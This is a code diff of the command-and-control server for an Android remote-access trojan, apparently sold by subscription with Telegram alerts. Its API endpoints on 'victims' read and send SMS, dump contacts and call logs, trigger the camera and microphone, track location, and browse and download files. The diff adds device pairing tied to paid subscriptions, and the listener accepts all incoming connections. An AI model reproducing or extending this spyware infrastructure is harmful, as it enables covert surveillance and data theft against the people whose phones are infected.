@@ -183,19 +183,19 @@ async function verifyDeviceOwnership(deviceId, telegramId) {
 // ========================================
 function createAPIServer(port = 3000) {
   const apiApp = express();
-  
+
   // Middleware
   apiApp.use(cors());
   apiApp.use(bodyParser.json());
   apiApp.use(bodyParser.urlencoded({ extended: true }));
 
   // ===== API ENDPOINTS =====
-  
+
   // Health check
   apiApp.get('/api/health', (req, res) => {
-    res.json({ 
-      success: true, 
-      status: 'running', 
+    res.json({
+      success: true,
+      status: 'running',
       version: '2.0.0',
       connectedDevices: Object.keys(victimsList.getVictimList()).length,
       databaseConnected: db ? true : false,
@@ -208,12 +208,12 @@ function createAPIServer(port = 3000) {
     try {
       const { telegram_id } = req.query;
       const victims = victimsList.getVictimList();
-      
+
       if (telegram_id) {
         // Filter victims by telegram_id
         const devices = await getDevicesByTelegramId(telegram_id);
         const deviceIds = devices.map(d => d.device_id);
-        
+
         const filteredVictims = Object.keys(victims)
           .filter(key => deviceIds.includes(key))
           .map(key => ({
@@ -225,10 +225,10 @@ function createAPIServer(port = 3000) {
             model: victims[key].model,
             release: victims[key].release
           }));
-        
+
         return res.json({ success: true, victims: filteredVictims, total: filteredVictims.length });
       }
-      
+
       // Return all victims if no telegram_id
       const victimsArray = Object.keys(victims).map(key => ({
         id: key,
@@ -239,7 +239,7 @@ function createAPIServer(port = 3000) {
         model: victims[key].model,
         release: victims[key].release
       }));
-      
+
       res.json({ success: true, victims: victimsArray, total: victimsArray.length });
     } catch (error) {
       res.status(500).json({ success: false, error: error.message });
@@ -250,21 +250,21 @@ function createAPIServer(port = 3000) {
   apiApp.get('/api/victims/:id', async (req, res) => {
     try {
       const { telegram_id } = req.query;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
       }
-      
-      res.json({ 
-        success: true, 
+
+      res.json({
+        success: true,
         victim: {
           id: req.params.id,
           ip: victim.ip,
@@ -284,29 +284,29 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/command', async (req, res) => {
     try {
       const { telegram_id } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
       }
 
       const { order, extra, data } = req.body;
-      
+
       if (!order) {
         return res.status(400).json({ success: false, error: 'Order is required' });
       }
 
       victim.socket.emit('order', { order, extra, ...data });
-      
+
       await updateDeviceLastActive(req.params.id);
-      
+
       res.json({ success: true, message: 'Command sent successfully' });
     } catch (error) {
       res.status(500).json({ success: false, error: error.message });
@@ -317,14 +317,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/camera', async (req, res) => {
     try {
       const { telegram_id, cameraId = 0 } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -346,14 +346,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/location', async (req, res) => {
     try {
       const { telegram_id } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -371,14 +371,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/sms/list', async (req, res) => {
     try {
       const { telegram_id } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -396,14 +396,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/sms/send', async (req, res) => {
     try {
       const { telegram_id, to, message } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -413,11 +413,11 @@ function createAPIServer(port = 3000) {
         return res.status(400).json({ success: false, error: 'Phone number and message are required' });
       }
 
-      victim.socket.emit('order', { 
-        order: 'x0000sm', 
-        extra: 'sendSMS', 
-        to: to, 
-        sms: message 
+      victim.socket.emit('order', {
+        order: 'x0000sm',
+        extra: 'sendSMS',
+        to: to,
+        sms: message
       });
 
       await updateDeviceLastActive(req.params.id);
@@ -431,14 +431,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/contacts', async (req, res) => {
     try {
       const { telegram_id } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -456,14 +456,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/calls', async (req, res) => {
     try {
       const { telegram_id } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -481,14 +481,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/microphone', async (req, res) => {
     try {
       const { telegram_id, duration = 10 } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -506,25 +506,25 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/files/list', async (req, res) => {
     try {
       const { telegram_id, path = '/storage/emulated/0/' } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
       }
 
-      victim.socket.emit('order', { 
-        order: 'x0000fm', 
-        extra: 'ls', 
-        path: path 
+      victim.socket.emit('order', {
+        order: 'x0000fm',
+        extra: 'ls',
+        path: path
       });
-      
+
       await updateDeviceLastActive(req.params.id);
       res.json({ success: true, message: 'File list request sent' });
     } catch (error) {
@@ -536,14 +536,14 @@ function createAPIServer(port = 3000) {
   apiApp.post('/api/victims/:id/files/download', async (req, res) => {
     try {
       const { telegram_id, path } = req.body;
-      
+
       if (telegram_id) {
         const isOwner = await verifyDeviceOwnership(req.params.id, telegram_id);
         if (!isOwner) {
           return res.status(403).json({ success: false, error: 'Access denied' });
         }
       }
-      
+
       const victim = victimsList.getVictim(req.params.id);
       if (victim === -1) {
         return res.status(404).json({ success: false, error: 'Victim not found' });
@@ -553,12 +553,12 @@ function createAPIServer(port = 3000) {
         return res.status(400).json({ success: false, error: 'File path is required' });
       }
 
-      victim.socket.emit('order', { 
-        order: 'x0000fm', 
-        extra: 'dl', 
-        path: path 
+      victim.socket.emit('order', {
+        order: 'x0000fm',
+        extra: 'dl',
+        path: path
       });
-      
+
       await updateDeviceLastActive(req.params.id);
       res.json({ success: true, message: 'File download initiated' });
     } catch (error) {
@@ -693,7 +693,7 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       maxHttpBufferSize: 1024 * 1024 * 100,
       cors: { origin: "*", methods: ["GET", "POST"] }
     });
-    
+
     IOs[port].sockets.pingInterval = 10000;
     IOs[port].sockets.pingTimeout = 10000;
 
@@ -714,96 +714,225 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
       // TERIMA SEMUA KONEKSI DULU (NO PAIRING CODE CHECK)
       // ========================================
       const deviceName = `${query.manf} ${query.model}`;
-      
-      // Check if device already paired in database
-      const checkDevice = victimsList.getDeviceInfo?.(index) || null;
 
       // Add to victims list (TERIMA SEMUA KONEKSI)
       victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
 
-      // Notification window (hanya untuk yang sudah paired)
-      if (checkDevice) {
-        let notification = new BrowserWindow({
-          frame: false,
-          x: display.bounds.width - 280,
-          y: display.bounds.height - 78,
-          show: false,
-          width: 280,
-          height: 78,
-          resizable: false,
-          skipTaskbar: true,
-          alwaysOnTop: true,
-          webPreferences: {
-            nodeIntegration: true,
-            enableRemoteModule: true,
-            contextIsolation: false
-          }
-        });
-
-        notification.webContents.on('did-finish-load', function () {
-          notification.show();
-          setTimeout(function () { notification.destroy() }, 3000);
-        });
-
-        notification.webContents.victim = victimsList.getVictim(index);
-        notification.loadFile(path.join(__dirname, 'app/notification.html'));
-      }
-
+      console.log('✅ Device connected (unpaired)');
       win.webContents.send('SocketIO:NewVictim', index);
 
-      // Auto update last active (hanya untuk yang sudah paired)
-      let activeInterval = null;
-      if (checkDevice) {
-        activeInterval = setInterval(async () => {
+      socket.on('pair_device', async function (data) {
+        try {
+          const pairingCode = data.pairing_code;
+          console.log(`\n🔐 Pairing attempt for device ${index} with code: ${pairingCode}`);
+
+          // Verifikasi pairing code di database
+          const [pairingRows] = await db.execute(
+            `SELECT pc.*, s.type, s.users, s.telegram_id, s.id as subscription_id
+         FROM pairing_codes pc 
+         JOIN subscriptions s ON pc.subscription_id = s.id 
+         WHERE pc.pairing_code = ? 
+         AND pc.used = 0 
+         AND pc.expires_at > NOW()
+         AND s.is_active = 1`,
+            [pairingCode]
+          );
+
+          if (pairingRows.length === 0) {
+            console.log('❌ Invalid or expired pairing code');
+            socket.emit('pair_result', {
+              success: false,
+              message: 'Kode pairing tidak valid atau sudah kadaluarsa!'
+            });
+            return;
+          }
+
+          const pairingData = pairingRows[0];
+          const subscriptionId = pairingData.subscription_id;
+          const telegramId = pairingData.telegram_id;
+
+          // Check device limit
+          let maxDevices;
+          if (pairingData.type === 'lifetime' && pairingData.users === 0) {
+            maxDevices = Infinity;
+          } else {
+            maxDevices = parseInt(pairingData.users);
+          }
+
+          const [countRes] = await db.execute(
+            'SELECT COUNT(*) AS total FROM devices WHERE subscription_id = ? AND status = "active"',
+            [subscriptionId]
+          );
+
+          if (countRes[0].total >= maxDevices) {
+            console.log('❌ Device limit reached');
+            socket.emit('pair_result', {
+              success: false,
+              message: 'Batas maksimal device sudah tercapai!'
+            });
+            return;
+          }
+
+          // Mark pairing code as used
           await db.execute(
-            'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
+            'UPDATE pairing_codes SET used = 1, used_at = NOW(), device_id = ? WHERE pairing_code = ?',
+            [index, pairingCode]
+          );
+
+          // Add/Update device to database
+          const [existingDevice] = await db.execute(
+            'SELECT * FROM devices WHERE device_id = ?',
             [index]
           );
-        }, 30000);
-      }
 
+          if (existingDevice.length > 0) {
+            // Update existing device
+            await db.execute(
+              `UPDATE devices 
+           SET subscription_id = ?, telegram_id = ?, device_name = ?, 
+               last_active = NOW(), status = 'active', paired_at = NOW()
+           WHERE device_id = ?`,
+              [subscriptionId, telegramId, deviceName, index]
+            );
+          } else {
+            // Insert new device
+            await db.execute(
+              `INSERT INTO devices (subscription_id, telegram_id, device_id, device_name, last_active, status) 
+           VALUES (?, ?, ?, ?, NOW(), 'active')`,
+              [subscriptionId, telegramId, index, deviceName]
+            );
+          }
+
+          console.log('✅ Device paired successfully!');
+
+          // Send success response to device
+          socket.emit('pair_result', {
+            success: true,
+            message: 'Pairing berhasil! Device Anda sudah terhubung.'
+          });
+
+          // Send notification to Telegram
+          await sendTelegramMessage(telegramId, `
+🎉 *Device Berhasil Terpair!*
+
+📱 Device: ${deviceName}
+🆔 ID: \`${index}\`
+🌍 IP: ${ip}
+🌍 Country: ${country || 'Unknown'}
+📅 Time: ${new Date().toLocaleString('id-ID')}
+
+Gunakan /victims untuk melihat device online.
+      `);
+
+          // Show notification window in desktop app
+          let notification = new BrowserWindow({
+            frame: false,
+            x: display.bounds.width - 280,
+            y: display.bounds.height - 78,
+            show: false,
+            width: 280,
+            height: 78,
+            resizable: false,
+            skipTaskbar: true,
+            alwaysOnTop: true,
+            webPreferences: {
+              nodeIntegration: true,
+              enableRemoteModule: true,
+              contextIsolation: false
+            }
+          });
+
+          notification.webContents.on('did-finish-load', function () {
+            notification.show();
+            setTimeout(function () { notification.destroy() }, 3000);
+          });
+
+          notification.webContents.victim = victimsList.getVictim(index);
+          notification.loadFile(path.join(__dirname, 'app/notification.html'));
+
+        } catch (error) {
+          console.error('Error during pairing:', error);
+          socket.emit('pair_result', {
+            success: false,
+            message: 'Terjadi error saat pairing: ' + error.message
+          });
+        }
+      });
+      // ========================================
+      // END HANDLER PAIRING
+      // ========================================
+
+      // ========================================
+      // AUTO UPDATE LAST ACTIVE (ONLY FOR PAIRED DEVICES)
+      // ========================================
+      let activeInterval = setInterval(async () => {
+        try {
+          const [device] = await db.execute(
+            'SELECT * FROM devices WHERE device_id = ? AND status = "active"',
+            [index]
+          );
+
+          if (device.length > 0) {
+            await db.execute(
+              'UPDATE devices SET last_active = NOW() WHERE device_id = ?',
+              [index]
+            );
+          }
+        } catch (error) {
+          console.error('Error updating last active:', error);
+        }
+      }, 30000);
+
+      // ========================================
+      // DISCONNECT HANDLER
+      // ========================================
       socket.on('disconnect', async function () {
-        if (activeInterval) clearInterval(activeInterval);
+        clearInterval(activeInterval);
         victimsList.rmVictim(index);
-        
-        // Update status to inactive (hanya untuk yang sudah paired)
-        if (checkDevice) {
-          try {
+
+        try {
+          // Check if device was paired
+          const [device] = await db.execute(
+            'SELECT d.*, u.telegram_id FROM devices d JOIN users u ON d.telegram_id = u.telegram_id WHERE d.device_id = ? AND d.status = "active"',
+            [index]
+          );
+
+          if (device.length > 0) {
             await db.execute(
               'UPDATE devices SET status = "inactive" WHERE device_id = ?',
               [index]
             );
-          } catch (error) {
-            console.error('Error updating device status:', error);
-          }
 
-          // Send disconnect notification
-          await sendTelegramMessage(checkDevice.telegram_id, `
+            // Send disconnect notification only for paired devices
+            await sendTelegramMessage(device[0].telegram_id, `
 ⚠️ *Device Disconnected*
 
-📱 Device: ${checkDevice.device_name || deviceName}
+📱 Device: ${device[0].device_name || deviceName}
 🆔 ID: \`${index}\`
 📅 Time: ${new Date().toLocaleString('id-ID')}
-          `);
+        `);
+          }
+        } catch (error) {
+          console.error('Error handling disconnect:', error);
         }
 
         win.webContents.send('SocketIO:RemoveVictim', index);
-        
+
         if (windows[index]) {
           BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:VictimDisconnected");
-          delete windows[index]
+          delete windows[index];
         }
       });
     });
 
-    event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port + ' (accepting all connections)');
-    listeningStatus[port] = true;
-    
-  } catch (error) {
-    console.error('Listen Error:', error);
-    event.reply('SocketIO:ListenError', '[x] Error: ' + error.message);
-  }
-});
+      event.reply('SocketIO:Listen', '[✓] Started Listening on Port: ' + port + ' (accepting all connections)');
+      listeningStatus[port] = true;
+
+    } catch (error) {
+      console.error('Listen Error:', error);
+      event.reply('SocketIO:ListenError', '[x] Error: ' + error.message);
+    }
+  });
 
 ipcMain.on('SocketIO:Stop', function (event, port) {
   if (IOs[port]) {
